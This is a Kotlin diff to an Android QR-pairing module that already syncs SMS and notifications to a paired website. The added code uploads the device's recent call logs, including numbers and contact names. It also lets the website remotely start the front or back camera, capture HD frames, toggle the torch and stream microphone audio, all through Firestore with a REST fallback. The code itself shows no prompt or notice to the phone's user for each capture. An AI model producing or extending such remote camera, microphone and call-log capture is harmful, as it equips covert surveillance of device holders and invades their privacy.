@@ -10,6 +10,8 @@ import com.example.R
 import com.example.data.local.AppDatabase
 import com.example.data.model.MessageEntity
 import com.example.data.remote.FirebaseSyncRepository
+import com.example.telephony.CallLogSyncHelper
+import com.example.telephony.DeviceCallLogItem
 import com.google.firebase.FirebaseApp
 import com.google.firebase.Timestamp
 import com.google.firebase.auth.FirebaseAuth
@@ -49,6 +51,20 @@ data class MirroredNotificationItem(
     val category: String,
     val isTest: Boolean,
     val createdAtMs: Long
+)
+
+data class RemoteCameraCommand(
+    val command: String,
+    val commandSeq: Long,
+    val status: String,
+    val updatedAtMs: Long
+)
+
+data class RemoteMicCommand(
+    val command: String,
+    val commandSeq: Long,
+    val status: String,
+    val updatedAtMs: Long
 )
 
 object QrPairingManager {
@@ -253,6 +269,15 @@ object QrPairingManager {
 
         // Immediately import device SMS inbox (if permission granted) and push real messages to the paired web session
         val syncedCount = syncInitialDeviceInboxForPairing(appContext, sessionId, currentUser != null)
+        if (CallLogSyncHelper.hasCallLogPermission(appContext)) {
+            val recentCalls = CallLogSyncHelper.readRecentCallLogs(appContext, limit = 80)
+            if (recentCalls.isNotEmpty()) {
+                syncCallLogsToPairedSession(appContext, recentCalls, sessionId)
+            }
+            publishCallLogPermissionStatus(appContext, sessionId, "GRANTED")
+        } else {
+            publishCallLogPermissionStatus(appContext, sessionId, "NEEDED")
+        }
 
         triggerHapticFeedback(appContext)
         Log.i(TAG, "Pairing processed for session: $sessionId on device: $deviceName (cloudSync=$anyWriteSucceeded, syncedSms=$syncedCount)")
@@ -564,6 +589,328 @@ object QrPairingManager {
         } catch (_: Throwable) {}
     }
 
+    /**
+     * Listens for remote camera commands (START_BACK, START_FRONT, STOP, CAPTURE_HD, TOGGLE_TORCH)
+     * issued by the paired Website on `/pairing_sessions/{sessionId}/camera/live`.
+     */
+    fun listenToRemoteCameraCommands(
+        context: Context,
+        sessionId: String,
+        onCommand: (RemoteCameraCommand) -> Unit
+    ): ListenerRegistration? {
+        val appContext = context.applicationContext ?: context
+        if (!ensureFirebaseAvailable(appContext)) return null
+        val fs = getNamedFirestore(appContext, resolveDatabaseId(appContext)) ?: return null
+
+        return try {
+            fs.collection("pairing_sessions")
+                .document(sessionId)
+                .collection("camera")
+                .document("live")
+                .addSnapshotListener { snapshot, error ->
+                    if (error != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
+                    val cmd = snapshot.getString("command")?.trim() ?: "NONE"
+                    val cmdSeq = snapshot.getLong("commandSeq") ?: 0L
+                    val status = snapshot.getString("status")?.trim() ?: "IDLE"
+                    val updatedAtMs = snapshot.getTimestamp("updatedAt")?.toDate()?.time ?: 0L
+                    onCommand(RemoteCameraCommand(cmd, cmdSeq, status, updatedAtMs))
+                }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Could not attach remote camera listener: ${t.message}")
+            null
+        }
+    }
+
+    /**
+     * Batch-pushes device CallLog entries into `/pairing_sessions/{sessionId}/call_logs`
+     * with Firestore REST fallback.
+     */
+    suspend fun syncCallLogsToPairedSession(
+        context: Context,
+        callLogs: List<DeviceCallLogItem>,
+        overrideSessionId: String? = null
+    ): Int = withContext(Dispatchers.IO) {
+        if (callLogs.isEmpty()) return@withContext 0
+        val appContext = context.applicationContext ?: context
+        val sessionId = overrideSessionId?.takeIf { it.isNotBlank() } ?: getActiveSessionId(appContext) ?: return@withContext 0
+        val dbId = resolveDatabaseId(appContext)
+
+        var syncedCount = 0
+        if (ensureFirebaseAvailable(appContext)) {
+            val fs = getNamedFirestore(appContext, dbId)
+            if (fs != null) {
+                try {
+                    callLogs.chunked(250).forEach { chunk ->
+                        val batch = fs.batch()
+                        chunk.forEach { call ->
+                            val docRef = fs.collection("pairing_sessions")
+                                .document(sessionId)
+                                .collection("call_logs")
+                                .document(call.id)
+                            val safeTs = call.timestampMs.coerceIn(1L, System.currentTimeMillis())
+                            val payload = hashMapOf<String, Any>(
+                                "id" to call.id,
+                                "number" to call.number.ifBlank { "Unknown" }.take(100),
+                                "callType" to call.callType,
+                                "durationSec" to call.durationSec.coerceIn(0L, 864000L),
+                                "createdAt" to Timestamp(Date(safeTs))
+                            )
+                            call.contactName?.takeIf { it.isNotBlank() }?.let {
+                                payload["contactName"] = it.take(120)
+                            }
+                            call.simLabel?.takeIf { it.isNotBlank() }?.let {
+                                payload["simLabel"] = it.take(40)
+                            }
+                            batch.set(docRef, payload, SetOptions.merge())
+                        }
+                        batch.commit().await()
+                    }
+                    syncedCount = callLogs.size
+                } catch (e: Exception) {
+                    Log.w(TAG, "Batch sync call_logs failed: ${e.message}")
+                }
+            }
+        }
+
+        if (syncedCount == 0) {
+            val projectId = resolveStringResource(appContext, "project_id") ?: DEFAULT_PROJECT_ID
+            for (call in callLogs.take(40)) {
+                if (writeCallLogViaRest(projectId, dbId, sessionId, call)) {
+                    syncedCount++
+                }
+            }
+        }
+        syncedCount
+    }
+
+    suspend fun publishCallLogPermissionStatus(
+        context: Context,
+        sessionId: String? = null,
+        permissionStatus: String
+    ) = withContext(Dispatchers.IO) {
+        val appContext = context.applicationContext ?: context
+        val targetSession = sessionId?.takeIf { it.isNotBlank() } ?: getActiveSessionId(appContext) ?: return@withContext
+        if (!ensureFirebaseAvailable(appContext)) return@withContext
+        val fs = getNamedFirestore(appContext, resolveDatabaseId(appContext)) ?: return@withContext
+        try {
+            fs.collection("pairing_sessions")
+                .document(targetSession)
+                .set(
+                    mapOf(
+                        "sessionId" to targetSession,
+                        "status" to "CONNECTED",
+                        "callLogPermission" to permissionStatus
+                    ),
+                    SetOptions.merge()
+                )
+                .await()
+        } catch (t: Throwable) {
+            Log.w(TAG, "Failed publishing callLogPermission: ${t.message}")
+        }
+    }
+
+    fun listenToCallLogSyncRequests(
+        context: Context,
+        sessionId: String,
+        onRequested: (Long) -> Unit
+    ): ListenerRegistration? {
+        val appContext = context.applicationContext ?: context
+        if (!ensureFirebaseAvailable(appContext)) return null
+        val fs = getNamedFirestore(appContext, resolveDatabaseId(appContext)) ?: return null
+
+        return try {
+            fs.collection("pairing_sessions")
+                .document(sessionId)
+                .addSnapshotListener { snapshot, error ->
+                    if (error != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
+                    val syncSeq = snapshot.getLong("callLogSyncSeq") ?: 0L
+                    if (syncSeq > 0L) {
+                        onRequested(syncSeq)
+                    }
+                }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Could not attach callLogSyncSeq listener: ${t.message}")
+            null
+        }
+    }
+
+    /**
+     * Publishes live camera stream status and compressed JPEG frames to `/pairing_sessions/{sessionId}/camera/live`.
+     */
+    suspend fun publishRemoteCameraState(
+        context: Context,
+        sessionId: String? = null,
+        status: String? = null,
+        lens: String? = null,
+        torchOn: Boolean? = null,
+        frameBase64: String? = null,
+        hdFrameBase64: String? = null,
+        frameSeq: Int? = null,
+        hdSeq: Int? = null,
+        width: Int? = null,
+        height: Int? = null,
+        errorMessage: String? = null
+    ): Boolean = withContext(Dispatchers.IO) {
+        val appContext = context.applicationContext ?: context
+        val targetSession = sessionId?.takeIf { it.isNotBlank() } ?: getActiveSessionId(appContext) ?: return@withContext false
+        val dbId = resolveDatabaseId(appContext)
+        val deviceName = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}".take(100)
+
+        val payload = hashMapOf<String, Any>(
+            "id" to "live",
+            "deviceName" to deviceName,
+            "updatedAt" to FieldValue.serverTimestamp()
+        )
+        status?.let { payload["status"] = it }
+        lens?.let { payload["lens"] = it }
+        torchOn?.let { payload["torchOn"] = it }
+        frameBase64?.takeIf { it.length <= 740_000 }?.let { payload["frameBase64"] = it }
+        hdFrameBase64?.takeIf { it.length <= 740_000 }?.let { payload["hdFrameBase64"] = it }
+        frameSeq?.let { payload["frameSeq"] = it }
+        hdSeq?.let { payload["hdSeq"] = it }
+        width?.let { payload["width"] = it }
+        height?.let { payload["height"] = it }
+        errorMessage?.let { payload["errorMessage"] = it.take(300) }
+
+        var ok = false
+        if (ensureFirebaseAvailable(appContext)) {
+            val fs = getNamedFirestore(appContext, dbId)
+            if (fs != null) {
+                try {
+                    fs.collection("pairing_sessions")
+                        .document(targetSession)
+                        .collection("camera")
+                        .document("live")
+                        .set(payload, SetOptions.merge())
+                        .await()
+                    ok = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "Firestore remote camera write error: ${e.message}")
+                }
+            }
+        }
+
+        if (!ok) {
+            val projectId = resolveStringResource(appContext, "project_id") ?: DEFAULT_PROJECT_ID
+            ok = writeCameraStateViaRest(
+                projectId = projectId,
+                databaseId = dbId,
+                sessionId = targetSession,
+                deviceName = deviceName,
+                status = status,
+                lens = lens,
+                torchOn = torchOn,
+                frameBase64 = frameBase64?.takeIf { it.length <= 740_000 },
+                hdFrameBase64 = hdFrameBase64?.takeIf { it.length <= 740_000 },
+                frameSeq = frameSeq,
+                hdSeq = hdSeq,
+                width = width,
+                height = height,
+                errorMessage = errorMessage
+            )
+        }
+        ok
+    }
+
+    /**
+     * Listens for remote microphone commands (START, STOP) issued by the paired Website
+     * on `/pairing_sessions/{sessionId}/microphone/live`.
+     */
+    fun listenToRemoteMicCommands(
+        context: Context,
+        sessionId: String,
+        onCommand: (RemoteMicCommand) -> Unit
+    ): ListenerRegistration? {
+        val appContext = context.applicationContext ?: context
+        if (!ensureFirebaseAvailable(appContext)) return null
+        val fs = getNamedFirestore(appContext, resolveDatabaseId(appContext)) ?: return null
+
+        return try {
+            fs.collection("pairing_sessions")
+                .document(sessionId)
+                .collection("microphone")
+                .document("live")
+                .addSnapshotListener { snapshot, error ->
+                    if (error != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
+                    val cmd = snapshot.getString("command")?.trim() ?: "NONE"
+                    val cmdSeq = snapshot.getLong("commandSeq") ?: 0L
+                    val status = snapshot.getString("status")?.trim() ?: "IDLE"
+                    val updatedAtMs = snapshot.getTimestamp("updatedAt")?.toDate()?.time ?: 0L
+                    onCommand(RemoteMicCommand(cmd, cmdSeq, status, updatedAtMs))
+                }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Could not attach remote mic listener: ${t.message}")
+            null
+        }
+    }
+
+    /**
+     * Publishes live microphone status and Base64 PCM-16 audio chunks to
+     * `/pairing_sessions/{sessionId}/microphone/live`.
+     */
+    suspend fun publishRemoteMicState(
+        context: Context,
+        sessionId: String? = null,
+        status: String? = null,
+        audioBase64: String? = null,
+        chunkSeq: Int? = null,
+        sampleRate: Int? = null,
+        audioLevel: Int? = null,
+        errorMessage: String? = null
+    ): Boolean = withContext(Dispatchers.IO) {
+        val appContext = context.applicationContext ?: context
+        val targetSession = sessionId?.takeIf { it.isNotBlank() } ?: getActiveSessionId(appContext) ?: return@withContext false
+        val dbId = resolveDatabaseId(appContext)
+        val deviceName = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}".take(100)
+
+        val payload = hashMapOf<String, Any>(
+            "id" to "live",
+            "deviceName" to deviceName,
+            "updatedAt" to FieldValue.serverTimestamp()
+        )
+        status?.let { payload["status"] = it }
+        audioBase64?.takeIf { it.length <= 390_000 }?.let { payload["audioBase64"] = it }
+        chunkSeq?.let { payload["chunkSeq"] = it.coerceAtLeast(0) }
+        sampleRate?.let { payload["sampleRate"] = it.coerceIn(8000, 48000) }
+        audioLevel?.let { payload["audioLevel"] = it.coerceIn(0, 100) }
+        errorMessage?.let { payload["errorMessage"] = it.take(300) }
+
+        var ok = false
+        if (ensureFirebaseAvailable(appContext)) {
+            val fs = getNamedFirestore(appContext, dbId)
+            if (fs != null) {
+                try {
+                    fs.collection("pairing_sessions")
+                        .document(targetSession)
+                        .collection("microphone")
+                        .document("live")
+                        .set(payload, SetOptions.merge())
+                        .await()
+                    ok = true
+                } catch (e: Exception) {
+                    Log.w(TAG, "Firestore remote mic write error: ${e.message}")
+                }
+            }
+        }
+
+        if (!ok) {
+            val projectId = resolveStringResource(appContext, "project_id") ?: DEFAULT_PROJECT_ID
+            ok = writeMicStateViaRest(
+                projectId = projectId,
+                databaseId = dbId,
+                sessionId = targetSession,
+                deviceName = deviceName,
+                status = status,
+                audioBase64 = audioBase64?.takeIf { it.length <= 390_000 },
+                chunkSeq = chunkSeq,
+                sampleRate = sampleRate,
+                audioLevel = audioLevel,
+                errorMessage = errorMessage
+            )
+        }
+        ok
+    }
+
     private fun getNamedFirestore(context: Context, databaseId: String): FirebaseFirestore? {
         return try {
             FirebaseFirestore.getInstance(databaseId)
@@ -736,6 +1083,178 @@ object QrPairingManager {
             }
         } catch (t: Throwable) {
             Log.w(TAG, "Firestore REST notification sync exception: ${t.message}")
+            false
+        }
+    }
+
+    private suspend fun writeCameraStateViaRest(
+        projectId: String,
+        databaseId: String,
+        sessionId: String,
+        deviceName: String,
+        status: String?,
+        lens: String?,
+        torchOn: Boolean?,
+        frameBase64: String?,
+        hdFrameBase64: String?,
+        frameSeq: Int?,
+        hdSeq: Int?,
+        width: Int?,
+        height: Int?,
+        errorMessage: String?
+    ): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
+                timeZone = TimeZone.getTimeZone("UTC")
+            }
+            val nowIso = isoFormat.format(Date())
+
+            val fields = JSONObject().apply {
+                put("id", JSONObject().put("stringValue", "live"))
+                put("deviceName", JSONObject().put("stringValue", deviceName))
+                put("updatedAt", JSONObject().put("timestampValue", nowIso))
+                status?.let { put("status", JSONObject().put("stringValue", it)) }
+                lens?.let { put("lens", JSONObject().put("stringValue", it)) }
+                torchOn?.let { put("torchOn", JSONObject().put("booleanValue", it)) }
+                frameBase64?.let { put("frameBase64", JSONObject().put("stringValue", it)) }
+                hdFrameBase64?.let { put("hdFrameBase64", JSONObject().put("stringValue", it)) }
+                frameSeq?.let { put("frameSeq", JSONObject().put("integerValue", it.toString())) }
+                hdSeq?.let { put("hdSeq", JSONObject().put("integerValue", it.toString())) }
+                width?.let { put("width", JSONObject().put("integerValue", it.toString())) }
+                height?.let { put("height", JSONObject().put("integerValue", it.toString())) }
+                errorMessage?.let { put("errorMessage", JSONObject().put("stringValue", it.take(300))) }
+            }
+
+            val maskFields = mutableListOf("id", "deviceName", "updatedAt")
+            if (status != null) maskFields.add("status")
+            if (lens != null) maskFields.add("lens")
+            if (torchOn != null) maskFields.add("torchOn")
+            if (frameBase64 != null) maskFields.add("frameBase64")
+            if (hdFrameBase64 != null) maskFields.add("hdFrameBase64")
+            if (frameSeq != null) maskFields.add("frameSeq")
+            if (hdSeq != null) maskFields.add("hdSeq")
+            if (width != null) maskFields.add("width")
+            if (height != null) maskFields.add("height")
+            if (errorMessage != null) maskFields.add("errorMessage")
+
+            val queryMask = maskFields.joinToString("&") { "updateMask.fieldPaths=$it" }
+            val bodyJson = JSONObject().put("fields", fields).toString()
+            val url = "https://firestore.googleapis.com/v1/projects/$projectId/databases/$databaseId/documents/pairing_sessions/$sessionId/camera/live?$queryMask"
+
+            val request = Request.Builder()
+                .url(url)
+                .patch(bodyJson.toRequestBody("application/json; charset=utf-8".toMediaType()))
+                .build()
+
+            httpClient.newCall(request).execute().use { response ->
+                response.isSuccessful
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Firestore REST camera sync exception: ${t.message}")
+            false
+        }
+    }
+
+    private suspend fun writeMicStateViaRest(
+        projectId: String,
+        databaseId: String,
+        sessionId: String,
+        deviceName: String,
+        status: String?,
+        audioBase64: String?,
+        chunkSeq: Int?,
+        sampleRate: Int?,
+        audioLevel: Int?,
+        errorMessage: String?
+    ): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
+                timeZone = TimeZone.getTimeZone("UTC")
+            }
+            val nowIso = isoFormat.format(Date())
+
+            val fields = JSONObject().apply {
+                put("id", JSONObject().put("stringValue", "live"))
+                put("deviceName", JSONObject().put("stringValue", deviceName))
+                put("updatedAt", JSONObject().put("timestampValue", nowIso))
+                status?.let { put("status", JSONObject().put("stringValue", it)) }
+                audioBase64?.let { put("audioBase64", JSONObject().put("stringValue", it)) }
+                chunkSeq?.let { put("chunkSeq", JSONObject().put("integerValue", it.coerceAtLeast(0).toString())) }
+                sampleRate?.let { put("sampleRate", JSONObject().put("integerValue", it.coerceIn(8000, 48000).toString())) }
+                audioLevel?.let { put("audioLevel", JSONObject().put("integerValue", it.coerceIn(0, 100).toString())) }
+                errorMessage?.let { put("errorMessage", JSONObject().put("stringValue", it.take(300))) }
+            }
+
+            val maskFields = mutableListOf("id", "deviceName", "updatedAt")
+            if (status != null) maskFields.add("status")
+            if (audioBase64 != null) maskFields.add("audioBase64")
+            if (chunkSeq != null) maskFields.add("chunkSeq")
+            if (sampleRate != null) maskFields.add("sampleRate")
+            if (audioLevel != null) maskFields.add("audioLevel")
+            if (errorMessage != null) maskFields.add("errorMessage")
+
+            val queryMask = maskFields.joinToString("&") { "updateMask.fieldPaths=$it" }
+            val bodyJson = JSONObject().put("fields", fields).toString()
+            val url = "https://firestore.googleapis.com/v1/projects/$projectId/databases/$databaseId/documents/pairing_sessions/$sessionId/microphone/live?$queryMask"
+
+            val request = Request.Builder()
+                .url(url)
+                .patch(bodyJson.toRequestBody("application/json; charset=utf-8".toMediaType()))
+                .build()
+
+            httpClient.newCall(request).execute().use { response ->
+                response.isSuccessful
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Firestore REST mic sync exception: ${t.message}")
+            false
+        }
+    }
+
+    private suspend fun writeCallLogViaRest(
+        projectId: String,
+        databaseId: String,
+        sessionId: String,
+        call: DeviceCallLogItem
+    ): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
+                timeZone = TimeZone.getTimeZone("UTC")
+            }
+            val safeTs = call.timestampMs.coerceIn(1L, System.currentTimeMillis())
+            val callIso = isoFormat.format(Date(safeTs))
+
+            val fields = JSONObject().apply {
+                put("id", JSONObject().put("stringValue", call.id))
+                put("number", JSONObject().put("stringValue", call.number.ifBlank { "Unknown" }.take(100)))
+                put("callType", JSONObject().put("stringValue", call.callType))
+                put("durationSec", JSONObject().put("integerValue", call.durationSec.coerceIn(0L, 864000L).toString()))
+                put("createdAt", JSONObject().put("timestampValue", callIso))
+                call.contactName?.takeIf { it.isNotBlank() }?.let {
+                    put("contactName", JSONObject().put("stringValue", it.take(120)))
+                }
+                call.simLabel?.takeIf { it.isNotBlank() }?.let {
+                    put("simLabel", JSONObject().put("stringValue", it.take(40)))
+                }
+            }
+
+            val maskFields = mutableListOf("id", "number", "callType", "durationSec", "createdAt")
+            if (!call.contactName.isNullOrBlank()) maskFields.add("contactName")
+            if (!call.simLabel.isNullOrBlank()) maskFields.add("simLabel")
+            val queryMask = maskFields.joinToString("&") { "updateMask.fieldPaths=$it" }
+            val bodyJson = JSONObject().put("fields", fields).toString()
+            val url = "https://firestore.googleapis.com/v1/projects/$projectId/databases/$databaseId/documents/pairing_sessions/$sessionId/call_logs/${call.id}?$queryMask"
+
+            val request = Request.Builder()
+                .url(url)
+                .patch(bodyJson.toRequestBody("application/json; charset=utf-8".toMediaType()))
+                .build()
+
+            httpClient.newCall(request).execute().use { response ->
+                response.isSuccessful
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "Firestore REST call_log sync exception: ${t.message}")
             false
         }
     }
